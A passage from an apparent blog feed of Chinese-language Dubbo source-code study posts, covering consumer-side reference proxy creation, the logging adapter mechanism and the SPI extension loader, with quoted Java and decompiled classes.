对接spring的FactoryBean接口]D--&gt;E[ReferenceConfig createProxy]E--&gt;F[组装配置上下文url-含注册中心信息-具体的协议实现refer出Invoker实现&lt;br&gt;默认是DubboProtocolrefer出DubboInvoker]F--&gt;G[JavassistProxyFactory把上步的Invoker实例wrap起来生成消费的proxy]</code></pre><h3 id="DubboNamespaceHandler"><a href="#DubboNamespaceHandler" class="headerlink" title="DubboNamespaceHandler"></a>DubboNamespaceHandler</h3><p>dubbo:reference在spring中是一个自定义扩展标签。既然是自定义扩展，那么我们就要明白spring是如何开放了其自定义标签扩展机制的？或者说我要是想自定义一个标签该怎么和spring对接？</p><p>在dubbo-config-spring模块的/src/main/resources/META-INF/下发现了spring.handlers文件，其中内容如下</p><pre><code class="hljs properties"><span class="hljs-meta">http\://code.alibabatech.com/schema/dubbo</span>=<span class="hljs-string">com.alibaba.dubbo.config.spring.schema.DubboNamespaceHandler</span></code></pre><p>同级目录的还有dubbo.xsd,spring.schemas文件。dubbo.xsd定义了这些自定义扩展标签的格式(结构)。</p><p>阅读DubboNamespaceHandler代码。是org.springframework.beans.factory.xml.NamespaceHandlerSupport的子类。遵循spring的对接规定嘛。</p><p>其主要干的事，就是向spring注册自定义的标签解析器：</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;    registerBeanDefinitionParser(<span class="hljs-string">"application"</span>, <span class="hljs-keyword">new</span> DubboBeanDefinitionParser(ApplicationConfig<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">true</span>))</span>;       registerBeanDefinitionParser(<span class="hljs-string">"module"</span>, <span class="hljs-keyword">new</span> DubboBeanDefinitionParser(ModuleConfig<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">true</span>))</span>;       registerBeanDefinitionParser(<span class="hljs-string">"registry"</span>, <span class="hljs-keyword">new</span> DubboBeanDefinitionParser(RegistryConfig<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">true</span>))</span>;       registerBeanDefinitionParser(<span class="hljs-string">"monitor"</span>, <span class="hljs-keyword">new</span> DubboBeanDefinitionParser(MonitorConfig<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">true</span>))</span>;       registerBeanDefinitionParser(<span class="hljs-string">"provider"</span>, <span class="hljs-keyword">new</span> DubboBeanDefinitionParser(ProviderConfig<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">true</span>))</span>;       registerBeanDefinitionParser(<span class="hljs-string">"consumer"</span>, <span class="hljs-keyword">new</span> DubboBeanDefinitionParser(ConsumerConfig<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">true</span>))</span>;       registerBeanDefinitionParser(<span class="hljs-string">"protocol"</span>, <span class="hljs-keyword">new</span> DubboBeanDefinitionParser(ProtocolConfig<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">true</span>))</span>;       registerBeanDefinitionParser(<span class="hljs-string">"service"</span>, <span class="hljs-keyword">new</span> DubboBeanDefinitionParser(ServiceBean<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">true</span>))</span>;       registerBeanDefinitionParser(<span class="hljs-string">"reference"</span>, <span class="hljs-keyword">new</span> DubboBeanDefinitionParser(ReferenceBean<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">false</span>))</span>;       registerBeanDefinitionParser(<span class="hljs-string">"annotation"</span>, <span class="hljs-keyword">new</span> DubboBeanDefinitionParser(AnnotationBean<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">true</span>))</span>;   &#125;</code></pre><p>dubbo对所有标签都用了DubboBeanDefinitionParser这个一个类处理。</p><h3 id="DubboBeanDefinitionParser"><a href="#DubboBeanDefinitionParser" class="headerlink" title="DubboBeanDefinitionParser"></a>DubboBeanDefinitionParser</h3><p>DubboBeanDefinitionParser实现了org.springframework.beans.factory.xml.BeanDefinitionParser，构建(返回)BeanDefinition。</p><p>对于consumer侧reference bean在spring的BeanDefinition中的class是com.alibaba.dubbo.config.spring.ReferenceBean<T>。</p><p>dubbo在ReferenceBean的getObject中完成consumer侧真正消费者服务实例的创建。因为ReferenceBean也<strong>实现了spring的FactoryBean接口</strong>。</p><p>最终通过com.alibaba.dubbo.config.ReferenceConfig.createProxy(Map&lt;String, String&gt;)完成consumer的HelloService实例的创建。从ReferenceBean到ReferenceConfig.createProxy之间的调用栈如下：</p><pre><code class="hljs java">ReferenceBean&lt;T&gt;(ReferenceConfig&lt;T&gt;).createProxy(Map&lt;String,String&gt;) line: <span class="hljs-number">338</span>ReferenceBean&lt;T&gt;(ReferenceConfig&lt;T&gt;).init() line: <span class="hljs-number">300</span>ReferenceBean&lt;T&gt;(ReferenceConfig&lt;T&gt;).get() line: <span class="hljs-number">138</span>ReferenceBean&lt;T&gt;.getObject() line: <span class="hljs-number">65</span>DefaultListableBeanFactory(FactoryBeanRegistrySupport).doGetObjectFromFactoryBean(FactoryBean&lt;?&gt;, String) line: <span class="hljs-number">168</span></code></pre><h3 id="ReferenceConfig-createProxy分析"><a href="#ReferenceConfig-createProxy分析" class="headerlink" title="ReferenceConfig.createProxy分析"></a>ReferenceConfig.createProxy分析</h3><p>createProxy方法的主要流程：</p><pre><code class="hljs mermaid">graph TDA(1.判断是哪种协议:InJVm,指定url直连,rpc-default-dubbo)--&gt;B[2.组装出url]B--&gt;C[3.用对应的Protocol扩展实现结合url推出Invoker实例]C--&gt;D[4.调用proxyFactory.getProxy创建代理的reference bean]</code></pre><p>第二步如果是InJvm，则处理代码如下：</p><pre><code class="hljs java">URL url = <span class="hljs-keyword">new</span> URL(Constants.LOCAL_PROTOCOL, NetUtils.LOCALHOST, <span class="hljs-number">0</span>, interfaceClass.getName()).addParameters(map);<span class="hljs-comment">// 直接new的URL的protocol是InJvm，然后下一步refer</span>invoker = refprotocol.refer(interfaceClass, url);</code></pre><p>第二步如果是默认的走zookeeper注册中心这种，类似我们demo那种，url组出来的样子大概如下：  </p><p>registry://127.0.0.1:2182/com.alibaba.dubbo.registry.RegistryService?application=consumer-of-helloworld-app&amp;dubbo=2.0.0&amp;pid=42451&amp;refer=application%3Dconsumer-of-helloworld-app%26dubbo%3D2.0.0%26interface%3Dcom.code260.ss.dubbo.demov.facade.service.HelloService%26methods%3DsayHello%26pid%3D42451%26side%3Dconsumer%26timeout%3D3000000%26timestamp%3D1588645452894&amp;registry=zookeeper&amp;timestamp=1588645571661</p><p>这个url的加工过程有个重要环节就是com.alibaba.dubbo.config.AbstractInterfaceConfig.loadRegistries(boolean)，该方法将注册中心的信息，如注册中心地址与端口127.0.0.1:2182，采用协议registry=zookeepe拼接到url中，并将url的协议设置成registry://，参见AbstractInterfaceConfig类192行处。</p><p>第三步 推出Invoker实例的逻辑比较简单，我们以默认的dubbo协议DubboProtocol为例子看下，就是new一个DubboInvoker实例的过程，将配置上下文url送进去：</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-function">Invoker&lt;T&gt; <span class="hljs-title">refer</span><span class="hljs-params">(Class&lt;T&gt; serviceType, URL url)</span> <span class="hljs-keyword">throws</span> RpcException </span>&#123;  <span class="hljs-comment">// create rpc invoker.</span>  DubboInvoker&lt;T&gt; invoker = <span class="hljs-keyword">new</span> DubboInvoker&lt;T&gt;(serviceType, url, getClients(url), invokers);  invokers.add(invoker);  <span class="hljs-keyword">return</span> invoker;&#125;</code></pre><p>第四步，调用proxyFactory.getProxy创建代理的reference bean，下面单独一个段落分析。</p><h3 id="ProxyFactory-getProxy"><a href="#ProxyFactory-getProxy" class="headerlink" title="ProxyFactory.getProxy"></a>ProxyFactory.getProxy</h3><p>getProxy主要处理的逻辑和流程有：</p><ol><li>植入回声服务EchoService  com.alibaba.dubbo.rpc.proxy.AbstractProxyFactory.getProxy(Invoker<T>)</li><li>生成代理类 com.alibaba.dubbo.common.bytecode.Proxy.getProxy(ClassLoader, Class&lt;?&gt;…)，com.alibaba.dubbo.common.bytecode.ClassGenerator。生成办法跟扩展点机制的adaptive机制的手法类似，依靠Javassist完成，具体细节参见刚才提到的getProxy方法和ClassGenerator类。大致描述下过程：<ol><li>先跟据interfaces构建<strong>proxy</strong>的class和<strong>Proxy</strong>的class，<strong>注意proxy的p的大小写</strong>！再用Proxy的实例调用其newInstance方法创建proxy实例。上面一句有点绕：<strong>proxy是相当于bean</strong>，<strong>Proxy相当于构建bean的builder</strong>，此处命名不是很友好，仅靠大小写区分。</li><li>Proxy实例会做cache ProxyCacheMap。</li><li>Proxy实例的命名是proxy后加一个整数  整数是通过PROXY_CLASS_COUNTER 这个AtomicLong维护<br>此处interfaces已经自动加入EchoService。</li></ol></li></ol><p>生成的代码：</p><p>Proxy相当于构建bean的builder:</p><pre><code class="hljs java">[arthas@<span class="hljs-number">43605</span>]$ jad com.alibaba.dubbo.common.bytecode.Proxy0ClassLoader:+-sun.misc.Launcher$AppClassLoader@<span class="hljs-number">18</span>b4aac2  +-sun.misc.Launcher$ExtClassLoader@<span class="hljs-number">7823</span>a2f9Location:<span class="hljs-comment">/*</span><span class="hljs-comment"> * Decompiled with CFR.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Could not load the following classes:</span><span class="hljs-comment"> *  com.alibaba.dubbo.common.bytecode.ClassGenerator$DC</span><span class="hljs-comment"> *  com.alibaba.dubbo.common.bytecode.Proxy</span><span class="hljs-comment"> */</span><span class="hljs-keyword">package</span> com.alibaba.dubbo.common.bytecode;<span class="hljs-keyword">import</span> com.alibaba.dubbo.common.bytecode.ClassGenerator;<span class="hljs-keyword">import</span> com.alibaba.dubbo.common.bytecode.Proxy;<span class="hljs-keyword">import</span> com.alibaba.dubbo.common.bytecode.proxy0;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proxy0</span></span><span class="hljs-class"><span class="hljs-keyword">extends</span> <span class="hljs-title">Proxy</span></span><span class="hljs-class"><span class="hljs-keyword">implements</span> <span class="hljs-title">ClassGenerator</span>.<span class="hljs-title">DC</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">newInstance</span><span class="hljs-params">(InvocationHandler invocationHandler)</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> proxy0(invocationHandler);    &#125;&#125;</code></pre><p>proxy是相当于bean:</p><pre><code class="hljs java">[arthas@<span class="hljs-number">43605</span>]$ jad com.alibaba.dubbo.common.bytecode.proxy0ClassLoader:+-sun.misc.Launcher$AppClassLoader@<span class="hljs-number">18</span>b4aac2  +-sun.misc.Launcher$ExtClassLoader@<span class="hljs-number">7823</span>a2f9Location:<span class="hljs-comment">/*</span><span class="hljs-comment"> * Decompiled with CFR.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Could not load the following classes:</span><span class="hljs-comment"> *  com.alibaba.dubbo.common.bytecode.ClassGenerator$DC</span><span class="hljs-comment"> *  com.alibaba.dubbo.rpc.service.EchoService</span><span class="hljs-comment"> *  com.code260.ss.dubbo.demov.facade.service.HelloService</span><span class="hljs-comment"> */</span><span class="hljs-keyword">package</span> com.alibaba.dubbo.common.bytecode;<span class="hljs-keyword">import</span> com.alibaba.dubbo.common.bytecode.ClassGenerator;<span class="hljs-keyword">import</span> com.alibaba.dubbo.rpc.service.EchoService;<span class="hljs-keyword">import</span> com.code260.ss.dubbo.demov.facade.service.HelloService;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">proxy0</span></span><span class="hljs-class"><span class="hljs-keyword">implements</span> <span class="hljs-title">ClassGenerator</span>.<span class="hljs-title">DC</span>,</span><span class="hljs-class"><span class="hljs-title">EchoService</span>,</span><span class="hljs-class"><span class="hljs-title">HelloService</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Method[] methods;    <span class="hljs-keyword">private</span> InvocationHandler handler;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sayHello</span><span class="hljs-params">(String string)</span> </span>&#123;        Object[] arrobject = <span class="hljs-keyword">new</span> Object[]&#123;string&#125;;        Object object = <span class="hljs-keyword">this</span>.handler.invoke(<span class="hljs-keyword">this</span>, methods[<span class="hljs-number">0</span>], arrobject);    &#125;    <span class="hljs-keyword">public</span> Object $echo(Object object) &#123;        Object[] arrobject = <span class="hljs-keyword">new</span> Object[]&#123;object&#125;;        Object object2 = <span class="hljs-keyword">this</span>.handler.invoke(<span class="hljs-keyword">this</span>, methods[<span class="hljs-number">1</span>], arrobject);        <span class="hljs-keyword">return</span> object2;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">proxy0</span><span class="hljs-params">()</span> </span>&#123;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">proxy0</span><span class="hljs-params">(InvocationHandler invocationHandler)</span> </span>&#123;        <span class="hljs-keyword">this</span>.handler = invocationHandler;    &#125;&#125;</code></pre><p>至此，HelloService在consumer侧reference bean的实现类生成完毕。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]05.dubbo日志机制</title>
    <link href="/2020/05/04/dubbo-05.logger-mechanism/"/>
    <url>/2020/05/04/dubbo-05.logger-mechanism/</url>
    
    <content type="html"><![CDATA[<h2 id="05-dubbo日志机制"><a href="#05-dubbo日志机制" class="headerlink" title="05.dubbo日志机制"></a>05.dubbo日志机制</h2><p>dubbo对于其日志机制，设计的还是比较灵活的，可以自由配置选用哪种日志框架。这样就能达成跟你的项目所采用的日志框架一致的目的。这是做中间件开发的同学一个值得学习的设计。tomcat是一直到8点几版本才开始能方便的支持不同日志框架的对接。早些版本都是要替换jar之类的办法，还是有一点麻烦的。有些开源框架只支持一种日志框架对接，这样就不是很好了。 </p><h3 id="入手处"><a href="#入手处" class="headerlink" title="入手处"></a>入手处</h3><p>分析其日志机制，从哪边入手呢？随便翻一个其用到日志的类，就可以作为入口了。比如我们前面刚讲过的ExtensionLoader。</p><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Logger logger = LoggerFactory.getLogger(ExtensionLoader<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Logger</span> </span>&#123;&#125;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoggerFactory</span> </span>&#123;&#125;</code></pre><h3 id="日志机制实现分析"><a href="#日志机制实现分析" class="headerlink" title="日志机制实现分析"></a>日志机制实现分析</h3><p>Logger是一个接口。dubbo为其做了Log4jLogger、Slf4jLogger、JdkLogger等实现。</p><p>LoggerFactory的getLogger主要由LoggerAdapter(LOGGER_ADAPTER)完成。LoggerAdapter有对应slf4j、log4j等实现。</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Logger <span class="hljs-title">getLogger</span><span class="hljs-params">(Class&lt;?&gt; key)</span> </span>&#123;  FailsafeLogger logger = LOGGERS.get(key.getName());  <span class="hljs-keyword">if</span> (logger == <span class="hljs-keyword">null</span>) &#123;    LOGGERS.putIfAbsent(key.getName(), <span class="hljs-keyword">new</span> FailsafeLogger(LOGGER_ADAPTER.getLogger(key)));<span class="hljs-comment">// LOGGER_ADAPTER完成Logger实例的获取</span>    logger = LOGGERS.get(key.getName());  &#125;  <span class="hljs-keyword">return</span> logger;&#125;</code></pre><p>那LOGGER_ADAPTER是什么时候什么逻辑指定的呢？</p><p>LoggerFactory的static块中指定的：</p><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;    String logger = System.getProperty(<span class="hljs-string">"dubbo.application.logger"</span>);<span class="hljs-comment">// 根据指定的日志框架名称设置LOGGER_ADAPTER</span>    <span class="hljs-keyword">if</span> (<span class="hljs-string">"slf4j"</span>.equals(logger)) &#123;    setLoggerAdapter(<span class="hljs-keyword">new</span> Slf4jLoggerAdapter());    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"jcl"</span>.equals(logger)) &#123;    setLoggerAdapter(<span class="hljs-keyword">new</span> JclLoggerAdapter());    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"log4j"</span>.equals(logger)) &#123;    setLoggerAdapter(<span class="hljs-keyword">new</span> Log4jLoggerAdapter());    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"jdk"</span>.equals(logger)) &#123;    setLoggerAdapter(<span class="hljs-keyword">new</span> JdkLoggerAdapter());    &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">try</span> &#123;    setLoggerAdapter(<span class="hljs-keyword">new</span> Log4jLoggerAdapter());            &#125; <span class="hljs-keyword">catch</span> (Throwable e1) &#123;                <span class="hljs-keyword">try</span> &#123;                setLoggerAdapter(<span class="hljs-keyword">new</span> Slf4jLoggerAdapter());                &#125; <span class="hljs-keyword">catch</span> (Throwable e2) &#123;                    <span class="hljs-keyword">try</span> &#123;                    setLoggerAdapter(<span class="hljs-keyword">new</span> JclLoggerAdapter());                    &#125; <span class="hljs-keyword">catch</span> (Throwable e3) &#123;                        setLoggerAdapter(<span class="hljs-keyword">new</span> JdkLoggerAdapter());                    &#125;                &#125;            &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setLoggerAdapter</span><span class="hljs-params">(LoggerAdapter loggerAdapter)</span> </span>&#123;<span class="hljs-keyword">if</span> (loggerAdapter != <span class="hljs-keyword">null</span>) &#123;Logger logger = loggerAdapter.getLogger(LoggerFactory<span class="hljs-class">.<span class="hljs-keyword">class</span>.<span class="hljs-title">getName</span>())</span>;logger.info(<span class="hljs-string">"using logger: "</span> + loggerAdapter.getClass().getName());LoggerFactory.LOGGER_ADAPTER = loggerAdapter; <span class="hljs-comment">// 设置LOGGER_ADAPTER</span><span class="hljs-keyword">for</span> (Map.Entry&lt;String, FailsafeLogger&gt; entry : LOGGERS.entrySet()) &#123;entry.getValue().setLogger(LOGGER_ADAPTER.getLogger(entry.getKey()));&#125;&#125;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]04.dubbo扩展点实现</title>
    <link href="/2020/05/04/dubbo-04.extension-loader-impl/"/>
    <url>/2020/05/04/dubbo-04.extension-loader-impl/</url>
    
    <content type="html"><![CDATA[<h2 id="04-dubbo扩展点实现"><a href="#04-dubbo扩展点实现" class="headerlink" title="04.dubbo扩展点实现"></a>04.dubbo扩展点实现</h2><h3 id="怎么入手分析与学习"><a href="#怎么入手分析与学习" class="headerlink" title="怎么入手分析与学习"></a>怎么入手分析与学习</h3><ol><li>可以看官方的ExtensionLoaderTest 测试用例，以这些具体的case作为入口。</li><li>也可以直接看ExtensionLoader代码。可以从getExtension,getAdaptiveExtension,getActivateExtension三个方法作为入口。</li></ol><h3 id="扩展点的使用"><a href="#扩展点的使用" class="headerlink" title="扩展点的使用"></a>扩展点的使用</h3><h4 id="配置文件相关"><a href="#配置文件相关" class="headerlink" title="配置文件相关"></a>配置文件相关</h4><p>配置文件放在哪里？</p><ol><li>META-INF/dubbo/internal/配置文件  </li><li>META-INF/dubbo/配置文件  </li><li>META-INF/services/配置文件  </li></ol><p>配置文件名是顶层接口全限定名，比如：com.alibaba.dubbo.rpc.Protocol  </p><p>配置文件中内容：<br>一行是一个实现类的定义，大致是<br>beanName=实现类的class的全限定名，这个后面还可以接上#xxx（这个能力实际使用少）。beanName=这部分不是必须的。可以仅仅写实现类的全限定名。   </p><h4 id="注解相关"><a href="#注解相关" class="headerlink" title="注解相关"></a>注解相关</h4><h5 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h5><p>SPI注解用在顶层接口上，其值表示这个接口的<strong>默认实现类的beanName</strong>，也即是说指定一个顶层接口的默认实现通过SPI注解加载顶层接口上指定即可。  </p><p>加了SPI注解的接口，我们就可以用扩展点机制结合配置文件的配置后，得到一个接口的具体实现，使用时如下：</p><pre><code class="hljs java"><span class="hljs-meta">@SPI</span>(<span class="hljs-string">"dubbo"</span>)<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Protocol</span> </span>&#123;  <span class="hljs-comment">// ...</span>&#125;ExtensionLoader.getExtensionLoader(Protocol<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getExtension</span>(<span class="hljs-title">DubboProtocol</span>.<span class="hljs-title">NAME</span>)</span>;</code></pre><h5 id="Adaptive"><a href="#Adaptive" class="headerlink" title="Adaptive"></a>Adaptive</h5><p>Adaptive注解用在<strong>顶层接口或者接口的方法</strong>上，其表示这个接口或者这个方法需要有adaptive的类委托完成，未加注解的会生成不支持的操作的方式实现。</p><p>我们以ProxyFactory为例子看下使用时具体做法。</p><p>首先，在对应的接口的方法上加了@Adaptive注解，表示这个方法需要adaptive。</p><pre><code class="hljs java"><span class="hljs-meta">@SPI</span>(<span class="hljs-string">"javassist"</span>)<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ProxyFactory</span> </span>&#123;    <span class="hljs-meta">@Adaptive</span>(&#123;Constants.PROXY_KEY&#125;)    &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">getProxy</span><span class="hljs-params">(Invoker&lt;T&gt; invoker)</span> <span class="hljs-keyword">throws</span> RpcException</span>;    <span class="hljs-meta">@Adaptive</span>(&#123;Constants.PROXY_KEY&#125;)    &lt;T&gt; <span class="hljs-function">Invoker&lt;T&gt; <span class="hljs-title">getInvoker</span><span class="hljs-params">(T proxy, Class&lt;T&gt; type, URL url)</span> <span class="hljs-keyword">throws</span> RpcException</span>;&#125;</code></pre><p>其次，在使用的地方主要代码如下：</p><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ProxyFactory proxyFactory = ExtensionLoader.getExtensionLoader(ProxyFactory<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getAdaptiveExtension</span>()</span>;<span class="hljs-comment">//...只列举相关代码</span><span class="hljs-comment">// 创建服务代理</span><span class="hljs-keyword">return</span> (T) proxyFactory.getProxy(invoker);</code></pre><h5 id="Activate"><a href="#Activate" class="headerlink" title="Activate"></a>Activate</h5><p>Activate注解用在实现类上，其表示实现类在rpc时根据url参数中以及注解中指定的key 目标value是否能匹配来决定此bean是否被选中(一般用在过滤器的命中判断上)。  </p><h3 id="扩展点实现"><a href="#扩展点实现" class="headerlink" title="扩展点实现"></a>扩展点实现</h3><h4 id="getExtension实现"><a href="#getExtension实现" class="headerlink" title="getExtension实现"></a>getExtension实现</h4><p>大概逻辑是：先从已经创建的instance中查找，找不到则创建。</p><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentMap&lt;String, Holder&lt;Object&gt;&gt; cachedInstances = <span class="hljs-keyword">new</span> ConcurrentHashMap&lt;String, Holder&lt;Object&gt;&gt;();<span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">getExtension</span><span class="hljs-params">(String name)</span> </span>&#123;  <span class="hljs-keyword">if</span> (name == <span class="hljs-keyword">null</span> || name.length() == <span class="hljs-number">0</span>)    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">"Extension name == null"</span>);  <span class="hljs-keyword">if</span> (<span class="hljs-string">"true"</span>.equals(name)) &#123;    <span class="hljs-keyword">return</span> getDefaultExtension();  &#125;  Holder&lt;Object&gt; holder = cachedInstances.get(name);  <span class="hljs-keyword">if</span> (holder == <span class="hljs-keyword">null</span>) &#123;    cachedInstances.putIfAbsent(name, <span class="hljs-keyword">new</span> Holder&lt;Object&gt;());    holder = cachedInstances.get(name);  &#125;  Object instance = holder.get();  <span class="hljs-keyword">if</span> (instance == <span class="hljs-keyword">null</span>) &#123;    <span class="hljs-keyword">synchronized</span> (holder) &#123;      instance = holder.get();      <span class="hljs-keyword">if</span> (instance == <span class="hljs-keyword">null</span>) &#123;        instance = createExtension(name);        holder.set(instance);      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> (T) instance;&#125;</code></pre><h5 id="createExtension"><a href="#createExtension" class="headerlink" title="createExtension"></a>createExtension</h5><p>创建分两到三步：</p><ol><li>构造实例 ExtensionLoader.createExtension</li><li>为实例的字段进行注入 ExtensionLoader.injectExtension</li><li>wrapper class的处理(未配置wrap的没有这一步骤)。cachedWrapperClasses是在扩展点load文件时就处理好了，ExtensionLoader的649行。wrap的处理就是将先扩展出来的实例作为下一个的构造函数和的参数传入。</li></ol><pre><code class="hljs java"><span class="hljs-keyword">if</span> (wrapperClasses != <span class="hljs-keyword">null</span> &amp;&amp; wrapperClasses.size() &gt; <span class="hljs-number">0</span>) &#123;  <span class="hljs-keyword">for</span> (Class&lt;?&gt; wrapperClass : wrapperClasses) &#123;    instance = injectExtension((T) wrapperClass.getConstructor(type).newInstance(instance));  &#125;&#125;</code></pre><p>这几步逻辑整体相对简单，主要靠反射完成，此处不再细细讲解代码了。</p><h4 id="getAdaptiveExtension实现"><a href="#getAdaptiveExtension实现" class="headerlink" title="getAdaptiveExtension实现"></a>getAdaptiveExtension实现</h4><p>扩展点对adaptive模式的支持，<strong>在整个dubbo中非常重要，使用广泛，如果这一步骤不能弄清楚的话，后面的代码阅读或有困扰</strong>，尤其在调试时，常常发现这个字段是adaptive后的，那个字段也是。</p><p>前文讲扩展点使用时，已经讲了，Adaptive模式支持两个级别： 类级别与方法级别。关于这一点我们可以看注解Adaptive的Target声明表示其支持TYPE和METHOD：</p><pre><code class="hljs java"><span class="hljs-meta">@Target</span>(&#123;ElementType.TYPE, ElementType.METHOD&#125;)<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Adaptive &#123;  <span class="hljs-comment">//......</span>&#125;</code></pre><p>dubbo自身代码中使用类级别的adaptive的不多，大概有AdaptiveCompiler和AdaptiveExtensionFactory。</p><p>不论是类级别的还是方法级别的adaptive，dubbo的扩展点机制都会为其生成一个扩展类。类级别的，一个类对应一个扩展类。方法级别的，一个类中的多个加了Adaptive注解的方法在一起生成一个扩展类。</p><p>代码入口处：ExtensionLoader.createAdaptiveExtension。</p><p>获取adaptive扩展实例的主要流程：</p><pre><code class="hljs mermaid">graph LRA[getAdaptiveExtensionClass&lt;br&gt;创建适配class] --&gt;B[newInstance&lt;br&gt;创建适配实例] B --&gt; C[injectExtension&lt;br&gt;注入相应字段]</code></pre><p>getAdaptiveExtensionClass创建适配class的流程:</p><pre><code class="hljs mermaid">graph LRA[createAdaptiveExtensionClassCode&lt;br&gt;生成适配class的代码] --&gt;B[Compiler.compile&lt;br&gt;编译适配class的代码] B --&gt;C[javassist.CtClass.toClass&lt;br&gt;javassist编译出class]</code></pre><p>通过上述两个流程图大概能明白扩展的适配实例的创建过程，就是通过生成代码的再编译出class再load上来后，再创建对应实例并注入字段的过程来完成的。</p><h5 id="生成adaptive代码"><a href="#生成adaptive代码" class="headerlink" title="生成adaptive代码"></a>生成adaptive代码</h5><p>代码在com.alibaba.dubbo.common.extension.ExtensionLoader.createAdaptiveExtensionClassCode()。</p><p>关于生成代码createAdaptiveExtensionClassCode的逻辑看两个生成的示例就大概明白了。</p><p>生成的代码可以在com.alibaba.dubbo.common.compiler.support.AdaptiveCompiler.compile(String, ClassLoader)断点，观察其第一个参数的值。也可以修改createAdaptiveExtensionClassCode代码的逻辑，让其顺便生成下toString逻辑，在toString中把生成的代码吐出来。还有个办法就是利用arthas这个在线诊断工具的<a href="https://alibaba.github.io/arthas/jad.html" target="_blank" rel="noopener">jad反编译命令</a>去反编译运行期的class。当然你可以自己把生成的class的byte写入到一个文件后，将class的byte写文件可以通过CtClass的API writeFile来完成（dubbo默认采用Javassist的CtClass类编译），手动反编译，推荐工具<a href="https://bitbucket.org/mstrobel/procyon" target="_blank" rel="noopener">procyon</a>。</p><h6 id="adaptive类代码示例"><a href="#adaptive类代码示例" class="headerlink" title="adaptive类代码示例"></a>adaptive类代码示例</h6><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.alibaba.dubbo.registry;<span class="hljs-keyword">import</span> com.alibaba.dubbo.common.extension.ExtensionLoader;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RegistryFactory</span>$<span class="hljs-title">Adaptive</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">com</span>.<span class="hljs-title">alibaba</span>.<span class="hljs-title">dubbo</span>.<span class="hljs-title">registry</span>.<span class="hljs-title">RegistryFactory</span> </span>&#123;<span class="hljs-keyword">public</span> com.alibaba.dubbo.registry.<span class="hljs-function">Registry <span class="hljs-title">getRegistry</span><span 